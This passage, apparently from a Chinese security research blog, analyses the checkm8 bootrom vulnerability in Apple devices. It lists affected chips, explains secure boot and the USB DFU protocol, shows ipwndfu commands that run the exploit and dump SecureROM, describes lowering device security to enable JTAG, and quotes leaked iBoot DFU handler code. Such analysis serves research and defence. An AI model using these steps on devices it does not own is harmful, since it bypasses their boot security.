<p>事后axi0mX用戏谑的语气说到“量子物理学的叠加理论表明，在有人审计SecureROM之前，可利用的漏洞既存在又不存在，这是一种状态的叠加”。</p>

<p>我们纵观整个iPhone越狱史，前人已经做了大量的工作，SecureROM的堆管理器和地址空间布局已经摸的大差不差了，再加上泄漏源码的助攻、官方补丁的提示，这说明最早在2018年年底，各种必要的条件已经具备，checkm8确实已经呼之欲出。</p>

<p>所以外界猜测，2018年泄漏的iBoot源码在checkm8的挖掘与利用上起到了一定程度的作用。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_14.07.21.png" alt="截屏2025-03-18 14.07.21.png" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.52.58.png" alt="截屏2025-03-18 13.52.58.png" /></p>

<p>据我们团队分析，ipwndfu工具在芯片型号适配、芯片命名、关键数据结构、ROP片段的选取等细节方面与泄漏的源码有较高的匹配程度。</p>

<h2 id="影响范围">影响范围</h2>

<table>
  <thead>
    <tr>
      <th><strong>SoC型号</strong></th>
      <th><strong>内部代号</strong></th>
      <th><strong>受影响的设备</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>A5</td>
      <td>S5L8940XSI</td>
      <td>iPhone 4S， iPad 2</td>
    </tr>
    <tr>
      <td>A5</td>
      <td>S5L8942XSI</td>
      <td>iPod touch 4，iPad 2/mini 1G，Apple TV 3</td>
    </tr>
    <tr>
      <td>A5</td>
      <td>S5L8947XSI</td>
      <td>Apple TV 2/3</td>
    </tr>
    <tr>
      <td>A5X</td>
      <td>S5L8945XSI</td>
      <td>iPad 3</td>
    </tr>
    <tr>
      <td>A6</td>
      <td>S5L8950XSI</td>
      <td>iPhone 5/5C</td>
    </tr>
    <tr>
      <td>A6X</td>
      <td>S5L8955XSI</td>
      <td>iPad4</td>
    </tr>
    <tr>
      <td>A7</td>
      <td>S5L8960XSI</td>
      <td>iPhone 5S，iPad Air 1，iPad mini 2/3</td>
    </tr>
    <tr>
      <td>S1</td>
      <td>S7002SI</td>
      <td>Apple Watch 1代</td>
    </tr>
    <tr>
      <td>A8</td>
      <td>T7000SI</td>
      <td>iPhone 6/6 plus， iPad mini 4， Apple TV 4，iPod touch 6</td>
    </tr>
    <tr>
      <td>A8X</td>
      <td>T7001SI</td>
      <td>iPad Air 2</td>
    </tr>
    <tr>
      <td>A9</td>
      <td>S8000SI</td>
      <td>iPhone 6S/6S plus，iPhone SE一代，iPad5</td>
    </tr>
    <tr>
      <td>A9X</td>
      <td>S8001SI</td>
      <td>iPad Pro 1代</td>
    </tr>
    <tr>
      <td>A10</td>
      <td>T8010SI</td>
      <td>iPhone 7/7 plus，iPad 6/7，iPod touch 7</td>
    </tr>
    <tr>
      <td>A10X</td>
      <td>T8011SI</td>
      <td>iPad Pro（2017），Apple TV 4K</td>
    </tr>
    <tr>
      <td>A11</td>
      <td>T8015SI</td>
      <td>iPhone 8/ 8 plus/X</td>
    </tr>
    <tr>
      <td> </td>
      <td>T8002SI</td>
      <td>Apple Watch Series 1/2</td>
    </tr>
    <tr>
      <td>S3</td>
      <td>T8004SI</td>
      <td>Apple Watch Series 3</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>iPhone设备</li>
</ul>

<p>iPhone 4S，iPhone 5 / 5C / 5S，iPhone 6 / 6 Plus / 6S / 6S plus，iPhone SE 一代，iPhone 7 / 7 Plus，iPhone 8 / 8 Plus，iPhone X</p>

<ul>
  <li>iPad设备</li>
</ul>

<p>iPad Air 1，iPad mini 1G，iPad 2 / mini 2，iPad 3 / mini3，iPad 4 / mini4，iPad 5，iPad 6，iPad 7，iPad Pro 1代</p>

<ul>
  <li>iPod设备</li>
</ul>

<p>iPod touch 4，iPod touch 6，iPod touch 7</p>

<ul>
  <li>Apple TV设备</li>
</ul>

<p>Apple TV 2，Apple TV 3，Apple TV 4，Apple TV 4K</p>

<ul>
  <li>Apple Watch设备</li>
</ul>

<p>Apple Watch 1代，Apple Watch Series 1 / 2 / 3</p>

<ul>
  <li>不受影响的设备</li>
</ul>

<p>使用A12及以上芯片的设备不受影响，例如iPhone XS / XR</p>

<h1 id="研究对象">研究对象</h1>

<p>研究对象是淘宝二手iPhone7手机。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/WechatIMG921.jpg" alt="WechatIMG921.jpg" /></p>

<p>iPhone7手机使用的SoC处理器是苹果A10芯片，该芯片苹果内部代号为T8010SI。</p>

<p>A10芯片使用的是<strong>ARMv8-A</strong> 架构，支持 AArch64和 AArch32两种执行状态。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.54.29.png" alt="截屏2025-03-09 13.54.29.png" /></p>

<h1 id="ios安全启动机制">iOS安全启动机制</h1>

<p>参考链接：</p>

<p><a href="https://zhuanlan.zhihu.com/p/87456653">https://zhuanlan.zhihu.com/p/87456653</a></p>

<p><a href="https://newosxbook.com/bonus/iBoot.pdf">https://newosxbook.com/bonus/iBoot.pdf</a></p>

<p>iOS老旧设备的启动过程分为4个阶段：BootROM —&gt; LLB —&gt; iBoot —&gt; Kernelcache。</p>

<p>从A10处理器开始，LLB阶段被合并到iBoot，由BootROM直接启动iBoot，启动过程变为3个阶段：</p>

<p>BootROM  —&gt; iBoot —&gt; Kernelcache。</p>

<p>以下是苹果对iBoot的定义：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iBoot</span>

<span class="n">Code</span> <span class="n">that</span> <span class="n">loads</span> <span class="n">XNU</span><span class="p">,</span> <span class="k">as</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="n">secure</span> <span class="n">boot</span> <span class="n">chain</span><span class="p">.</span> <span class="n">Depending</span> <span class="n">on</span> <span class="n">the</span> 
<span class="n">system</span> <span class="n">on</span> <span class="nf">chip </span><span class="p">(</span><span class="n">SoC</span><span class="p">)</span> <span class="n">generation</span><span class="p">,</span> <span class="n">iBoot</span> <span class="n">may</span> <span class="n">be</span> <span class="n">loaded</span> <span class="n">by</span> <span class="n">the</span> <span class="n">Low</span><span class="o">-</span><span class="n">Level</span> <span class="n">Bootloader</span> 
<span class="ow">or</span> <span class="n">directly</span> <span class="n">by</span> <span class="n">the</span> <span class="n">Boot</span> <span class="n">ROM</span><span class="p">.</span>
</code></pre></div></div>

<ul>
  <li>BootROM</li>
</ul>

<p>固化在CPU内部的一段代码，CPU上电后执行的第一行代码，作用是初始化系统环境，对iBoot进行加载和验签，若验证通过则跳转到iBoot；</p>

<ul>
  <li>iBoot</li>
</ul>

<p>第二阶段引导程序，作用是进一步初始化环境，对内核进行加载和验签，若内核验证通过则跳转到内核；</p>

<ul>
  <li>Kernelcache</li>
</ul>

<p>iOS系统内核，对OS进行加载和验签；</p>

<ul>
  <li>OS</li>
</ul>

<p>iOS用户界面、后台服务等非核心组件。OS和Kernelcache的关系类比Android和Linux内核的关系。</p>

<ul>
  <li>APP</li>
</ul>

<p>苹果设备运行的用户APP也需要经过验签才能运行。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%90%AF%E5%8A%A8%E9%98%B6%E6%AE%B5.jpg" alt="checkm8-启动阶段.jpg" /></p>

<p>可以看到，苹果设备的启动被划分为多个阶段，前一个阶段要验证后一个阶段的代码是否经过苹果签名，验证通过才会加载并运行后一个阶段，由此形成一条信任链，确保最终用户操作的数据和代码是安全的没有被恶意修改过的。</p>

<h2 id="securerom简介">SecureROM简介</h2>

<p>SecureROM是苹果对BootROM的内部称呼，它俩是一个东西。</p>

<p>SecureROM是泄漏的iBoot工程文件的一部分，位于apps/SecureROM目录下。</p>

<p>SecureROM 作为系统启动时执行的第一段程序，扮演着整个安全启动链技术的信任基石。</p>

<p>iOS的根证书被烧录在芯片的ROM中。系统的启动从根证书开始一级一级校验，确保加载的下一级内容是经过苹果签名的，任何一级校验失败都会导致设备无法启动，文件系统无法解密。</p>

<p>根证书被添加在SecureROM的末尾，在芯片制造过程中随着SecureROM一起烧录进去。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-14_16.09.43.png" alt="截屏2025-03-14 16.09.43.png" /></p>

<p>SecureROM的安全体现在：</p>

<ul>
  <li>封杀写权限</li>
</ul>

<p>芯片制造出来之后就无法被修改，即使是苹果公司也无法在成品芯片上面修改。</p>

<ul>
  <li>封杀读权限</li>
</ul>

<p>从BootROM跳转到iBoot的过程中，要经过一段trampoline代码，这段代码通过置位系统安全寄存器，关闭了ROM的读取权限。也就是说过了SecureROM阶段，即使在iBoot阶段攻破系统，也读不到SecureROM和根证书的内容。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-14_15.58.40.png" alt="截屏2025-03-14 15.58.40.png" /></p>

<p>一位知乎博主评价说：“苹果的想法很单纯——如果一段程序黑客读都读不到，改也改不了，那么这段程序应该就会很安全。我们连程序内容都看不到，怎么分析程序漏洞？”</p>

<h1 id="dfu模式协议">DFU模式/协议</h1>

<h2 id="dfu模式和dfu协议介绍">DFU模式和DFU协议介绍</h2>

<p>Device Firmware Update（DFU）“设备固件升级”的简称，是作为启动失败的保护。</p>

<p>DFU模式是苹果手机救砖的最后手段，当设备因系统崩溃、越狱失败、OTA 升级失败或其他严重问题而无法正常启动时，DFU模式可以帮助恢复设备。</p>

<p>SecureROM实现了DFU模式，在DFU模式下可以对设备固件进行升级或者降级，在DFU过程中用户数据可能会被擦除。</p>

<p>有2种方式可以进入DFU模式：1. iBoot验证不通过无法加载 2. 通过GPIO引脚设置，按键进入DFU模式就是GPIO引脚设置的方法。</p>

<p>USB协议栈对DFU协议做了描述：<a href="https://usb.org/sites/default/files/DFU_1.1.pdf">https://usb.org/sites/default/files/DFU_1.1.pdf</a></p>

<p>USB DFU协议是基于USB<a href="https://www.usbzh.com/article/detail-55.html">控制传输</a>模式的，定义了固件升级中主机和设备的通信过程。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-DFU%E5%8D%8F%E8%AE%AE.jpg" alt="checkm8-DFU协议.jpg" /></p>

<h2 id="usb通信过程">USB通信过程</h2>

<p>USB也许是我们最熟悉，但又是最陌生的数据通信协议。最熟悉是因为USB设备随处可见，我们不经意中就会用到USB。最陌生是因为随着硬件的发展，USB协议的内涵已经远超最初的框架，兼容了大量的设备，成为了宇宙通用协议。</p>

<p>主机和设备端点之间有4种通信模式，分别为<a href="https://www.usbzh.com/article/detail-109.html">中断传输</a>模式，<a href="https://www.usbzh.com/article/detail-55.html">控制传输</a>模式、<a href="https://www.usbzh.com/article/detail-40.html">批量传输</a>模式和<a href="https://www.usbzh.com/article/detail-118.html">同步传输</a>模式。</p>

<p>USB DFU模式使用的是控制传输模式。该模式下一次传输称为Transaction，一个Transaction包含3个阶段：</p>

<ul>
  <li>Setup阶段
    <ul>
      <li>主机向设备发送setup token</li>
      <li>主机向设备发送setup数据，由协议栈实现
        <ul>
          <li>bmRequestType，定义请求的方向、请求类型和接收者</li>
          <li>bRequest， 定义的请求的具体事项</li>
          <li>wValue、wIndex，根据bRequest的不同而具体定义</li>
          <li>wLength，Data阶段发送/接收的数据长度</li>
        </ul>
      </li>
      <li>设备向主机应答ACK</li>
    </ul>
  </li>
  <li>Data阶段，数据通信方向由Setup阶段的bmRequestType决定，主机从设备获取数据就是IN，设备从主机接收数据或者执行命令就是OUT。数据分段为最小数据传输单元进行传输，在iPhone DFU模式中最小传输单元是0x40字节。
    <ul>
      <li>主机到设备传输OUT
        <ul>
          <li>主机向设备发送OUT token，表示主机已经做好发送数据的准备</li>
          <li>主机向设备发送一个最小数据传输单元</li>
          <li>设备向主机应答ACK表示接收成功</li>
        </ul>
      </li>
      <li>设备向主机传输IN
        <ul>
          <li>主机向设备发送IN token，表示主机已经做好接收数据的准备</li>
          <li>设备向主机发送一个最小数据传输单元</li>
          <li>主机向设备应答ACK表示接收成功</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Status阶段，所有数据传输完毕
    <ul>
      <li>对于OUT传输，主机向设备发送IN token，设备向主机返回一个空数据包表示成功</li>
      <li>对于IN传输，主机向设备发送OUT token，随后再向设备发送一个空数据包表示成功</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.42.52.png" alt="截屏2025-03-12 10.42.52.png" /></p>

<p>以上3个阶段组成一个Transaction。</p>

<p>从抓包数据来看，不一定每个IN或者OUT token都能被正确应答。一次最小数据单元的传输，只有被正确应答才能进行下一个传输。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.59.25.png" alt="截屏2025-03-12 10.59.25.png" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.38.22.png" alt="截屏2025-03-12 10.38.22.png" /></p>

<h1 id="iphone7进入dfu模式的方法">iPhone7进入DFU模式的方法</h1>

<h2 id="关机状态下进入dfu">关机状态下进入DFU</h2>

<ol>
  <li>打开爱思助手，并将 iPhone 连接在电脑上；</li>
  <li>长按电源键关闭 iPhone；</li>
  <li>长按<strong>电源键</strong> 3 秒，之后同时按下<strong>电源键</strong>和<strong>「音量 -」键</strong> 10 秒；</li>
  <li>松开电源键，继续按住<strong>「音量 -」键</strong> 5 秒；</li>
  <li>如果此时屏幕处于黑屏状态，同时 iTunes 提示检测到一台处于恢复模式的 iPhone，则表示进入 DFU 模式。</li>
</ol>

<h2 id="开机状态下进入dfu">开机状态下进入DFU</h2>

<ol>
  <li>按下<strong>「音量 -」；</strong></li>
  <li>按下电源键；</li>
  <li>屏幕会先点亮，然后黑屏，黑屏4秒钟之后松开电源键；</li>
  <li>10秒钟后再松开<strong>「音量 -」。</strong></li>
</ol>

<h1 id="ipwndfu工具初探">ipwndfu工具初探</h1>

<p><a href="https://github.com/axi0mX/ipwndfu">ipwndfu</a>工具是一个旧款iPhone手机的越狱合集，可以利用这次的checkm8漏洞实现对iPhone7手机的SecureROM固件提取。</p>

<p>该工具运行在Python2.7.18环境下，需要进行miniconda虚拟环境配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 下载安装python2.7.18环境</span>
<span class="nv">$ </span>conda create <span class="nt">-n</span> checkm8 <span class="nv">python</span><span class="o">=</span>2.7
<span class="c"># 激活环境</span>
<span class="nv">$ </span>conda activate checkm8
<span class="c"># 执行exp</span>
<span class="nv">$ </span><span class="nb">sudo </span>python2 ./ipwndfu <span class="nt">-p</span>
<span class="c"># 把SecurityROM dump到本级目录</span>
<span class="nv">$ </span><span class="nb">sudo </span>python2 ./ipwndfu <span class="nt">--dump-rom</span>
<span class="c"># 退出环境</span>
<span class="nv">$ </span>conda deactivate checkm8
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_14.29.57.png" alt="截屏2025-02-20 14.29.57.png" /></p>

<p>SecureROM-t8010si-2696.0.0.1.33-ROMRELEASE.dump就是通过漏洞dump出来的SoC里面的SecurityROM。</p>

<p>可以与<a href="https://securerom.fun/">https://securerom.fun/</a>这里下载的固件进行比对，经测试，固件是一致的。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_14.55.35.png" alt="截屏2025-02-20 14.55.35.png" /></p>

<h1 id="苹果设备启动过程">苹果设备启动过程</h1>

<ul>
  <li>平台启动：设置特定于平台的寄存器；</li>
  <li>重定位循环：</li>
  <li>CPU初始化：初始化MMU、设置系统寄存器SCTLR；</li>
  <li>初始化时钟、SRAM总线、GPIO引脚；</li>
  <li>在A12平台上，会设置ARMv8.3的PAC随机种子；</li>
  <li>系统初始化：初始化堆和进程子系统；</li>
  <li>平台早期初始化：苹果设备特定初始化例程，包括电源管理、主板和芯片初始化、串口初始化；</li>
  <li>检查DFU引脚，确定是否强制进入DFU模式；</li>
  <li>平台后期初始化：其他的苹果设备特定初始化例程，主板其他组件的初始化；</li>
  <li>获取引导设备和所选的引导配置。这通常会加载下一阶段（由illb标签标记）。但如果该阶段无法加载（或者前面被强制DFU了），那么就会下降到DFU模式；</li>
</ul>

<h2 id="设备安全性降级">设备安全性降级</h2>

<p>设备出厂时会对CPFM写入值用于确定保护等级，CPFM一旦写入就不可更改。</p>

<p>零售产品CPFM=3，表示“安全、产品”</p>

<p>工程机的CPFM通常是1（安全、开发）或者0（不安全、开发）。</p>

<p>但是SecureROM会把CPFM读进内存，然后设置安全等级。</p>

<p>尽管CPFM是不可修改的，但是CPFM被SecureROM加载到寄存器中，该寄存器又被映射到内存地址，并且是可写的。</p>

<p>因此我们只要把寄存器的值修改掉，就可以降低设备的安全等级，打开JTAG调试器。</p>

<p>需要注意的是，设备降级在下一次重启之后就会失效，并不是永久的。</p>

<p>我们后面计划研究如何打开苹果手机的 JTAG 调试功能。</p>

<h1 id="漏洞分析">漏洞分析</h1>

<p>checkm8是位于SecureROM中USB DFU协议栈的两个漏洞：</p>

<ul>
  <li>主攻——UAF（直到A14芯片才修复）</li>
  <li>辅助——内存泄漏（A12芯片中修复）</li>
</ul>

<h2 id="usb子系统初始化">USB子系统初始化</h2>

<p>USB数据的处理由两部分组成，第一部分是USB中断处理例程，第二部分是USB任务。</p>

<p>从系统初始化角度来看，USB子系统的初始化最终完成2件事情，一是创建synopsys_otg_task任务响应setup数据包，二是注册synopsys_otg_int_handler中断处理例程。</p>

<p>每当发生USB中断，中断处理函数就把数据从DMA内存区域拷贝到EP0端点的USB任务队列，再通知synopsys_otg_task响应数据包。</p>

<p>usb_init函数完成USB子系统的初始化，调用路径为：
<em>main → boot_selected → getDFUImage → usb_init</em></p>

<p>usb_init函数完成了4件事：</p>

<ol>
  <li>
    <p>创建synopsys_otg_task任务，配合USB中断处理函数，相当于中断的下半部；</p>
  </li>
  <li>
    <p>在堆上面分配0x800大小的io_buffer，暂存接收到的启动镜像；</p>
  </li>
  <li>
    <p>注册DFU处理函数handler_interface_request，实现了DFU协议栈；</p>
  </li>
  <li>
    <p>注册USB中断处理函数synopsys_otg_int_handler；</p>

    <p>a. <strong>处理SETUP token 或者 OUT token</strong></p>

    <p>从DMA拷贝数据到全局数组ep0_rx_buffer[0x40]，通知synopsys_otg_task任务解析。从接收缓冲区的大小可知，DFU数据包分段长度为0x40字节；</p>

    <p>b.  <strong>处理IN token</strong></p>

    <p>继续DEVICE to HOST传输任务，设备向主机发送的数据包分段长度为0x40。</p>
  </li>
</ol>

<h2 id="dfu生命周期">DFU生命周期</h2>

<p>iPhone设备进入DFU模式后，_main函数进入while(1)循环，循环主体是boot_selected函数。</p>

<p>boot_selected函数调用getDFUImage函数试图从主机端接收启动镜像。</p>

<p>getDFUImage函数做了2件事情：</p>

<ol>
  <li>调用usb_init初始化USB子系统</li>
  <li>
    <p>睡眠等待dfu_event事件</p>

    <p>a. 在此期间中断处理函数synopsys_otg_int_handler和synopsys_otg_task任务接收DFU镜像</p>

    <p>b. 若DFU镜像接收完毕，或主机发送RESET命令，则dfu_done被置1，进入USB资源释放流程</p>
  </li>
</ol>

<p>返回boot_selected对接收到的DFU镜像验签，若验证失败则重入getDFUImage，重新初始化USB子系统，重新接收DFU镜像。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-DFU%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg" alt="checkm8-DFU生命周期.jpg" /></p>

<h2 id="dfu镜像接收过程">DFU镜像接收过程</h2>

<p>synopsys_otg_task一直在usb_task_event事件上等待，直到被中断处理例程synopsys_otg_int_handler唤醒，进入handle_interrupt处理USB报文。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_19.53.51.png" alt="截屏2025-03-12 19.53.51.png" /></p>

<p>handle_ep0_data_phase函数接收DFU镜像，调用路径为：</p>

<p>synopsys_otg_task → handle_interrupt → synopsys_otg_handle_ep0_out → usb_core_handle_usb_control_receive → handle_ep0_data_phase</p>

<p>DFU镜像接收过程为：</p>

<ol>
  <li>镜像包在主机端被分段为0x800大小发送；</li>
  <li>USB协议栈将0x800的数据分段为0x40大小传输；</li>
  <li>设备把接收到0x40个字节保存在io_buffer；</li>
  <li>若io_buffer的0x800空间被填满，把io_buffer内容拷贝到INSECURE_MEMORY区域；</li>
  <li>重复步骤1～4，直到DFU镜像接收完毕。</li>
</ol>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%95%9C%E5%83%8F%E6%8E%A5%E6%94%B6%E8%BF%87%E7%A8%8B.jpg" alt="checkm8-镜像接收过程.jpg" /></p>

<p>全局变量ep0_data_phase_buffer指示写入的位置，最初指向io_buffer缓冲区。DFU镜像片段被拷贝到io_buffer，更新ep0_data_phase_buffer指向下一个写入位置。</p>

<p>每收到一个DFU镜像片段就更新ep0_data_phase_rcvd，记录已接收的长度。</p>

<p>全局变量ep0_data_phase_length保存了本轮DFU镜像长度，若接收的数据达到预期长度，或最后一次接收的长度小于0x40，说明接收完毕，data_received把DFU镜像片段从io_buffer拷贝到0x1800B0000，该区域也叫INSECURE_MEMORY区域。</p>

<p>再调用usb_core_send_zlp向主机发送一个0长度数据包，表示可以传输下一个0x800片段。</p>

<p>最后清理全局变量，准备接收下一个0x800片段。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">handle_ep0_data_phase</span><span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">u_int32_t</span> <span class="n">data_rcvd</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">data_phase</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">remaining</span> <span class="o">=</span> <span class="n">ep0_data_phase_length</span> <span class="o">-</span> <span class="n">ep0_data_phase_rcvd</span><span class="p">;</span>
  <span class="n">to_copy</span> <span class="o">=</span> <span class="p">(</span><span class="n">data_rcvd</span> <span class="o">&gt;</span> <span class="n">remaining</span><span class="p">)</span> <span class="o">?</span> <span class="n">remaining</span> <span class="o">:</span> <span class="n">data_rcvd</span><span class="p">;</span>
    
  <span class="n">memcpy</span><span class="p">(</span><span class="n">ep0_data_phase_buffer</span><span class="p">,</span> <span class="n">rx_buffer</span><span class="p">,</span> <span class="n">to_copy</span><span class="p">);</span>
    
	<span class="n">ep0_data_phase_buffer</span> <span class="o">+=</span> <span class="n">to_copy</span><span class="p">;</span>
	<span class="n">ep0_data_phase_rcvd</span> <span class="o">+=</span> <span class="n">to_copy</span><span class="p">;</span>

	<span class="k">if</span><span class="p">((</span><span class="n">ep0_data_phase_rcvd</span> <span class="o">==</span> <span class="n">ep0_data_phase_length</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">data_rcvd</span> <span class="o">!=</span> <span class="n">EP0_MAX_PACKET_SIZE</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">data_received</span><span class="p">(</span><span class="n">ep0_data_phase_rcvd</span><span class="p">);</span>
		<span class="n">usb_core_send_zlp</span><span class="p">();</span> <span class="c1">//we should check returnval of call and possibly stall</span>
		<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">return</span><span class="p">;</span>
	
<span class="nl">done:</span>
    <span class="n">ep0_data_phase_rcvd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ep0_data_phase_length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ep0_data_phase_buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">ep0_data_phase_if_num</span> <span class="o">=</span> <span class="n">NO_DATA_PHASE_HANDLER</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>全局变量ep0_data_phase_buffer和ep0_data_phase_length由函数handle_interface_request赋值，该函数实现了USB DFU协议栈，具体过程如下：</p>

<p>第一步：在正式传输DFU镜像之前，主机需要发送bmRequest=0x21，bRequest=DFU_DNLOAD的SETUP package；</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-23_16.27.37.png" alt="截屏2025-03-23 16.27.37.png" /></p>

<p>第二步：全局变量ep0_data_phase_buffer作为引用传递给handle_interface_request函数作为参数；</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_handle_usb_control_receive</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="n">ep0_rx_buffer</span><span class="p">,</span> 
												<span class="n">bool</span> <span class="n">is_setup</span><span class="p">,</span> <span class="kt">int</span> <span class="n">receive_length</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">data_phase</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">setup_request</span><span class="p">,</span> <span class="n">ep0_rx_buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">setup_request</span><span class="p">));</span>	
	
	<span class="k">switch</span><span class="p">(</span><span class="n">setup_request</span><span class="p">.</span><span class="n">bmRequestType</span> <span class="o">&amp;</span> <span class="n">USB_REQ_TYPE_MASK</span><span class="p">)</span> <span class="p">{</span>	<span class="c1">//处理setup报文</span>
		<span class="k">case</span> <span class="n">USB_REQ_TYPE_CLASS</span> <span class="p">:</span>
			<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">handle_interface_request</span><span class="p">(</span><span class="o">&amp;</span><span class="n">setup_request</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ep0_data_phase_buffer</span><span class="p">);</span>
			<span class="n">ep0_data_phase_length</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
			<span class="k">goto</span> <span class="n">success</span><span class="p">;</span>
                                                                             
</code></pre></div></div>

<p>第三步：handle_interface_request函数中把io_buffer指针保存在全局变量ep0_data_phase_buffer中，把wLength字段作为返回值赋值给全局变量ep0_data_phase_length。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">handle_interface_request</span><span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_request</span> <span class="o">*</span><span class="n">request</span><span class="p">,</span>
																		 <span class="kt">uint8_t</span> <span class="o">**</span><span class="n">out_buffer</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">u_int8_t</span> <span class="n">bRequest</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">bRequest</span><span class="p">;</span>
	<span class="n">u_int16_t</span> <span class="n">wLength</span> <span class="o">=</span> <span class="n">request</span><span class="o">-&gt;</span><span class="n">wLength</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    
	<span class="k">if</span><span class="p">((</span><span class="n">request</span><span class="o">-&gt;</span><span class="n">bmRequestType</span> <span class="o">&amp;</span> <span class="n">USB_REQ_DIRECTION_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="n">USB_REQ_HOST2DEVICE</span><span class="p">)</span>
	<span class="p">{</span>    
		<span class="k">switch</span><span class="p">(</span><span class="n">bRequest</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="k">case</span> <span class="n">DFU_DNLOAD</span><span class="p">:</span>
			<span class="p">{</span>
				<span class="k">if</span><span class="p">(</span><span class="n">wLength</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
					<span class="p">.....</span>
				<span class="p">}</span>
				<span class="k">else</span> <span class="p">{</span>
					<span class="k">if</span><span class="p">(</span><span class="n">wLength</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">io_buffer</span><span class="p">))</span> <span class="p">{</span> <span class="c1">//wLength &lt;= 0x800</span>
						<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
					<span class="p">}</span>		
					<span class="o">*</span><span class="n">out_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">io_buffer</span><span class="p">;</span>
				<span class="p">}</span>
				<span class="n">expecting</span> <span class="o">=</span> <span class="n">wLength</span><span class="p">;</span>
				<span class="n">ret</span> <span class="o">=</span> <span class="n">wLength</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
</code></pre></div></div>

<p>io_buffer填满后调用data_received把数据拷贝到全局变量image_buffer指向的INSECURE_MEMORY区域。</p>

<p>其中全局变量image_buffer_size记录了DFU镜像的长度，该值只是定义DFU镜像的最大长度不得超过INSECURE_MEMORY区域的大小，并不是DFU镜像的真实长度。</p>

<p>全局变量total_received记录了INSECURE_MEMORY区域的写入位置。</p>

